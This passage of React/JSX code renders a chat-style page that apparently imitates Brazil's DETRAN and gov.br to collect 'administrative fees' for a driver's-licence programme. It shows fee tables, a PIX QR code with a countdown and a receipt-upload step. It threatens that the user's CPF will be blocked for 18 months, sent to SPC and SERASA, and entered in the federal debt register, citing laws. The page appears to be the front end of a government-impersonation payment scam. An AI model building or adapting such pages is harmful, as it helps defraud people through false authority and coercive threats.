                          <div className="flex justify-between bg-[#1351B4] text-white text-xs px-2 py-1">
                            <span>DISCRIMINAÇÃO DOS DÉBITOS</span>
                            <span>VALORES EM REAIS</span>
                          </div>
                          <div className="text-xs">
                            <div className="flex justify-between py-2 border-b">
                              <span>TAXA DE EXPEDIÇÃO DE DOCUMENTO (TED)</span>
                              <span>{taxas.ted.toFixed(2).replace('.', ',')}</span>
                            </div>
                            <div className="flex justify-between py-2 border-b">
                              <span>TAXA DE SERVIÇOS ADMINISTRATIVOS (TSA)</span>
                              <span>{taxas.tsa.toFixed(2).replace('.', ',')}</span>
                            </div>
                            <div className="flex justify-between py-2 border-b">
                              <span>TAXA DE PROCESSAMENTO ELETRÔNICO (TPE)</span>
                              <span>{taxas.tpe.toFixed(2).replace('.', ',')}</span>
                            </div>
                            <div className="flex justify-between py-2 font-bold">
                              <span>TOTAL</span>
                              <span>{taxas.total.toFixed(2).replace('.', ',')}</span>
                            </div>
                          </div>
                        </div>
                        <div className="mt-3 bg-yellow-50 border border-yellow-200 p-3 text-xs">
                          <p className="font-bold text-red-600">Observações:</p>
                          <p className="text-gray-700 mt-1">
                            Informamos que, caso o pagamento não seja realizado dentro do prazo estabelecido, o <span className="text-[#1351B4] font-semibold">CPF</span> do responsável ({formatCpf(userCpf)}) será bloqueado no programa pelo período de <span className="text-orange-600 font-bold">18 (dezoito) meses</span>. Além disso, o valor da taxa, acrescido de multas, será registrado no <span className="text-[#1351B4] font-semibold">CPF</span> junto aos órgãos de proteção ao crédito (<span className="font-semibold">SPC</span> e <span className="font-semibold">SERASA</span>), bem como inscrito em <span className="text-red-600 font-semibold">Dívida Ativa da União</span>, nos termos do art. 2º da <span className="text-[#1351B4]">Lei nº 6.830/1980</span> (Lei de Execuções Fiscais) e do art. 43 da <span className="text-[#1351B4]">Lei nº 8.078/1990</span>
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>
                )}
                {message.type === 'pix' && (
                  <div className="my-4 max-w-lg mx-auto">
                    <div className="bg-white border border-gray-300 rounded shadow-md p-4">
                      <div className="text-center border-b pb-3 mb-3">
                        <p className="text-xs text-gray-500">EMITIDO EM {dataFormatada} ÀS {horaFormatada}</p>
                        <p className="font-bold text-[#1351B4] mt-2">DETRAN/{detranSigla} - PAGAMENTO VIA PIX</p>
                        <p className="text-xs text-gray-500">Programa CNH do Brasil - Taxas Administrativas</p>
                      </div>
                      
                      <div className="text-center mb-4">
                        <p className="text-xs text-gray-500 mb-2">QR CODE PIX:</p>
                        {isLoadingPix ? (
                          <div className="flex justify-center py-8">
                            <Loader2 className="w-8 h-8 animate-spin text-[#1351B4]" />
                          </div>
                        ) : qrCodeUrl ? (
                          <Image src={qrCodeUrl} alt="QR Code PIX" width={200} height={200} className="mx-auto" />
                        ) : null}
                      </div>

                      <div className="mb-4">
                        <p className="text-xs text-gray-500 mb-1">CÓDIGO PIX COPIA E COLA:</p>
                        <div className="bg-gray-100 p-2 rounded text-xs break-all font-mono">
                          {pixCode || 'Gerando código...'}
                        </div>
                      </div>

                      <button
                        onClick={handleCopyPix}
                        disabled={!pixCode}
                        className="w-full bg-[#1351B4] text-white py-3 rounded flex items-center justify-center gap-2 hover:bg-[#0D3A8C] transition-colors disabled:opacity-50"
                      >
                        {copied ? <Check className="w-5 h-5" /> : <Copy className="w-5 h-5" />}
                        {copied ? 'Código Copiado!' : 'Copiar Código PIX'}
                      </button>

                      <div className="flex justify-between mt-4 text-xs">
                        <div>
                          <p className="text-gray-500">VENCIMENTO DA GUIA</p>
                          <p className="font-semibold">{dataFormatada}</p>
                        </div>
                        <div className="text-right">
                          <p className="text-gray-500">VALOR A PAGAR EM REAIS</p>
                          <p className="font-bold text-lg">R$ {taxas.total.toFixed(2).replace('.', ',')}</p>
                        </div>
                      </div>

                      <div className="mt-4 border-t border-dashed pt-4">
                        <div className="bg-yellow-50 border border-yellow-300 rounded p-3 text-center">
                          <div className="flex items-center justify-center gap-2">
                            <span className="flex gap-1">
                              <span className="w-2 h-2 bg-yellow-500 rounded-full animate-pulse"></span>
                              <span className="w-2 h-2 bg-yellow-500 rounded-full animate-pulse" style={{ animationDelay: '0.2s' }}></span>
                              <span className="w-2 h-2 bg-yellow-500 rounded-full animate-pulse" style={{ animationDelay: '0.4s' }}></span>
                            </span>
                            <span className="font-bold text-gray-700">AGUARDANDO PAGAMENTO</span>
                          </div>
                          <p className="text-xs text-gray-500 mt-1">Esta guia vence em: <span className="text-[#1351B4] font-mono">{formatTime(pixExpirationTime)}</span></p>
                        </div>
                      </div>
                    </div>
                  </div>
                )}
                {message.type === 'upload' && (
                  <div className="flex flex-col gap-4 mt-4 w-full">
                    {/* Botão Ativar meu cadastro */}
                    {!showUploadArea && (
                      <button
                        onClick={handleAtivarCadastro}
                        disabled={checkingPayment}
                        className="flex items-center justify-center gap-2 p-4 bg-[#22c55e] text-white rounded-sm shadow-md hover:bg-[#16a34a] transition-all disabled:opacity-50 disabled:cursor-not-allowed"
                      >
                        {checkingPayment ? (
                          <Loader2 className="w-5 h-5 animate-spin" />
                        ) : (
                          <Check className="w-5 h-5" />
                        )}
                        <span className="font-medium">
                          {checkingPayment ? 'Verificando pagamento...' : 'Ativar meu cadastro'}
                        </span>
                      </button>
                    )}

                    {/* Área de upload - aparece após verificar que não foi pago */}
                    {showUploadArea && (
                      <>
                        {/* Mensagem amarela */}
                        <div className="bg-[#FFF9E6] border border-[#E6D9A6] rounded-lg p-4">
                          <p className="text-[#8B7355] text-sm">
                            Não foi possível confirmar o pagamento automaticamente. Para ativar seu cadastro, clique abaixo e envie uma imagem do comprovante de pagamento.
                          </p>
                        </div>

                        {/* Input file */}
                        <input
                          type="file"
                          ref={fileInputRef}
                          onChange={handleFileSelect}
                          accept="image/*,application/pdf"
                          className="hidden"
                        />

                        {/* Área de seleção de arquivo */}
                        <button
                          onClick={() => fileInputRef.current?.click()}
                          className="w-full border-2 border-dashed border-gray-300 rounded-lg p-6 flex items-center justify-center gap-2 hover:border-[#1351B4] transition-colors bg-white"
                        >
                          <Upload className="w-5 h-5 text-gray-400" />
                          <span className="text-gray-600">
                            {selectedFile ? selectedFile.name : 'Clique para selecionar o comprovante'}
                          </span>
                        </button>

                        {/* Botão enviar */}
                        {selectedFile && (
                          <button
                            onClick={handleSubmitComprovante}
                            disabled={isLoadingPix}
                            className="flex items-center justify-center gap-2 p-4 bg-[#22c55e] text-white rounded-sm shadow-md hover:bg-[#16a34a] transition-all disabled:opacity-50 disabled:cursor-not-allowed"
                          >
                            {isLoadingPix ? (
                              <Loader2 className="w-5 h-5 animate-spin" />
                            ) : (
                              <Check className="w-5 h-5" />
                            )}
                            <span className="font-medium">Enviar e ativar cadastro</span>
                          </button>
                        )}
                      </>
                    )}
                  </div>
                )}
              </div>
            ))}

            {/* Typing indicator */}
            {isTyping && (
              <div className="mb-4 text-left">
                <div className="inline-block p-4 rounded-2xl shadow-sm bg-[#2670CC] rounded-tl-sm">
                  <div className="flex gap-1">
                    <div className="w-2 h-2 bg-white rounded-full animate-bounce" style={{ animationDelay: '0ms' }}></div>
                    <div className="w-2 h-2 bg-white rounded-full animate-bounce" style={{ animationDelay: '150ms' }}></div>
                    <div className="w-2 h-2 bg-white rounded-full animate-bounce" style={{ animationDelay: '300ms' }}></div>
                  </div>
                </div>
              </div>
            )}

            <div ref={messagesEndRef} />
          </div>

          {/* Loading consulta */}
          {isLoading && (
            <div className="flex justify-center my-4">
              <div className="bg-white border border-gray-200 rounded-lg p-4 flex items-center gap-3 shadow-sm">
                <Loader2 className="w-5 h-5 animate-spin text-[#1351B4]" />
                <span className="text-gray-700">Consultando vagas no Detran {detranSelecionado}...</span>
              </div>
            </div>
          )}

          {/* Loading cadastro RENACH */}
          {loadingCadastro && (
            <div className="flex justify-center my-4">
              <div className="bg-white border border-gray-200 rounded-lg p-4 flex items-center gap-3 shadow-sm">
                <Loader2 className="w-5 h-5 animate-spin text-[#1351B4]" />
                <span className="text-gray-700">{loadingMessage}</span>
              </div>
            </div>
          )}

          {/* Options */}
          {showOptions && currentOptions.length > 0 && currentOptions[0] === 'categoria' && (
            <div className="pb-4 space-y-2">
              <button
                onClick={() => handleCategoriaSelect('A', 'Categoria A')}
                className="w-full bg-white border border-gray-300 text-gray-700 p-4 rounded-lg font-medium hover:bg-gray-50 hover:border-[#1351B4] transition-all shadow-sm flex items-center gap-4"
              >
                <span className="text-[#1351B4] font-bold text-lg">A</span>
                <span>Categoria A - Motocicletas</span>
              </button>
              <button
                onClick={() => handleCategoriaSelect('B', 'Categoria B')}
                className="w-full bg-white border border-gray-300 text-gray-700 p-4 rounded-lg font-medium hover:bg-gray-50 hover:border-[#1351B4] transition-all shadow-sm flex items-center gap-4"
              >
                <span className="text-[#1351B4] font-bold text-lg">B</span>
                <span>Categoria B - Carros</span>
              </button>
              <button
                onClick={() => handleCategoriaSelect('AB', 'Categoria AB')}
                className="w-full bg-white border border-gray-300 text-gray-700 p-4 rounded-lg font-medium hover:bg-gray-50 hover:border-[#1351B4] transition-all shadow-sm flex items-center gap-4"
              >
                <span className="text-[#1351B4] font-bold text-lg">AB</span>
                <span>Categoria AB - Motocicletas e Carros</span>
              </button>
            </div>
          )}

          {/* Grid de meses com vagas */}
          {showMesesGrid && Object.keys(vagasMeses).length > 0 && (
            <div className="pb-4">
              <div className="grid grid-cols-3 gap-2">
                {Object.entries(vagasMeses).map(([mes, vagas]) => (
                  <button
                    key={mes}
                    onClick={() => handleMesSelect(mes)}
                    className="bg-white border border-gray-200 p-3 rounded-lg hover:border-[#1351B4] hover:shadow-md transition-all text-center"
                  >
                    <p className="font-semibold text-gray-800 text-sm">{mes}</p>
                    <p className="text-[#1351B4] text-sm font-medium">{vagas} vagas</p>
                  </button>
                ))}
              </div>
            </div>
          )}

          {showOptions && currentOptions.length > 0 && currentOptions[0] !== 'categoria' && (
            <div className="pb-4 flex flex-wrap gap-2 justify-end">
              {currentOptions.map((option, index) => (
                <button
                  key={index}
                  onClick={() => {
                    if (currentStep === 5 && option === 'Prosseguir') {
                      handleStep5Click();
                    } else if (currentStep === 6 && option === 'Finalizar Cadastro') {
                      handleStep6Click();
                    } else {
                      handleOptionClick(option);
                    }
                  }}
                  className="bg-gray-100 border border-gray-300 text-gray-700 px-6 py-3 rounded-2xl font-medium hover:bg-gray-200 transition-all shadow-sm flex items-center gap-2"
                >
                  {option}
                  {option === 'Prosseguir' && <span>›</span>}
                </button>
              ))}
            </div>
          )}
        </div>
      </main>
    </div>
  );
}
